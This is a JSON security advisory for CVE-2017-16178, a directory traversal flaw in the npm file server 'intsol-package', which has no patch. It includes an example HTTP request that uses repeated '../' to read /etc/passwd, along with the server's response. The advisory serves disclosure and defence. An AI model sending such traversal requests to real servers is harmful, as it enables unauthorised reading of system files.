{
    "Title": "Directory Traversal in intsol-package",
    "Meta": {
        "Package": [
            "intsol-package([npm](/advisories?query=ecosystem%3Anpm))"
        ],
        "Affected versions": [
            "<= 1.0.0"
        ],
        "Patched versions": [
            "None"
        ]
    },
    "Description": "`intsol-package` is a file server.\n\n`intsol-package` is vulnerable to a directory traversal issue, giving an\nattacker access to the filesystem by placing \"../\" in the url.\n\n**Example Request:**\n\n    \n    \n    GET /../../../../../../../../../../etc/passwd HTTP/1.1\n    host:localhost\n\nand the server's Response\n\n    \n    \n    HTTP/1.1 200 OK\n    Date: Thu, 04 May 2017 23:59:18 GMT\n    Connection: keep-alive\n    Transfer-Encoding: chunked\n    \n    {contents of /etc/passwd}\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if\nthe functionality is needed for production, a different package is used\ninstead.\n\n### References\n\n  * <https://nvd.nist.gov/vuln/detail/CVE-2017-16178>\n  * <https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/intsol-package>\n  * [GHSA-23wc-v4mf-x7v4](https://github.com/advisories/GHSA-23wc-v4mf-x7v4 \"GHSA-23wc-v4mf-x7v4\")\n  * <https://www.npmjs.com/advisories/461>\n\n",
    "Severity": {
        "Score": "7.5/ 10 (High)",
        "CVSS base metrics": {
            "Attack vector": "Network",
            "Attack complexity": "Low",
            "Privileges required": "None",
            "User interaction": "None",
            "Scope": "Unchanged",
            "Confidentiality": "High",
            "Integrity": "None",
            "Availability": "None"
        },
        "CVSS string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    },
    "Weaknesses": [
        "[CWE-22](/advisories?query=cwe%3A22)"
    ],
    "CVE ID": "CVE-2017-16178",
    "GHSA ID": "GHSA-23wc-v4mf-x7v4",
    "Source code": "No known source code"
}